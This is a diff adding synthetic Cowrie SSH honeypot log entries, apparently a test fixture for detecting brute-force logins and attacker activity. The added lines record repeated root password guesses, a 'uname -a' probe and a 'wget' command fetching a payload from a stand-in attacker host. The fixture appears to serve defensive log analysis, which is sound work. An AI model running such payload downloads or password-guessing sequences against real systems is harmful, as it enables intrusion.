@@ -3,3 +3,13 @@
 {"timestamp":"2025-08-26T14:06:44Z","src_ip":"185.10.10.10","username":"root","password":"toor","eventid":"cowrie.login.failed"}
 {"timestamp":"2025-08-26T14:10:00Z","src_ip":"185.10.10.10","username":"root","password":"correcthorsebattery","eventid":"cowrie.login.success"}
 {"timestamp":"2025-08-26T14:15:20Z","src_ip":"45.55.55.5","username":"pi","password":"raspberry","eventid":"cowrie.login.failed"}
+{"timestamp":"2025-08-26T14:10:15Z","src_ip":"185.10.10.10","input":"uname -a","eventid":"cowrie.command.input"}
+{"timestamp":"2025-08-26T14:10:20Z","src_ip":"185.10.10.10","input":"wget http://bad.example/payload","eventid":"cowrie.command.input"}
+{"timestamp":"2025-08-26T14:02:15Z","src_ip":"185.10.10.10","username":"root","password":"password1","eventid":"cowrie.login.failed"}
+{"timestamp":"2025-08-26T14:02:18Z","src_ip":"185.10.10.10","username":"root","password":"password2","eventid":"cowrie.login.failed"}
+{"timestamp":"2025-08-26T14:02:21Z","src_ip":"185.10.10.10","username":"root","password":"password3","eventid":"cowrie.login.failed"}
+{"timestamp":"2025-08-26T14:02:24Z","src_ip":"185.10.10.10","username":"root","password":"password4","eventid":"cowrie.login.failed"}
+{"timestamp":"2025-08-26T14:02:27Z","src_ip":"185.10.10.10","username":"root","password":"password5","eventid":"cowrie.login.failed"}
+{"timestamp":"2025-08-26T14:02:30Z","src_ip":"185.10.10.10","username":"root","password":"password6","eventid":"cowrie.login.failed"}
+{"timestamp":"2025-08-26T14:02:33Z","src_ip":"185.10.10.10","username":"root","password":"password7","eventid":"cowrie.login.failed"}
+
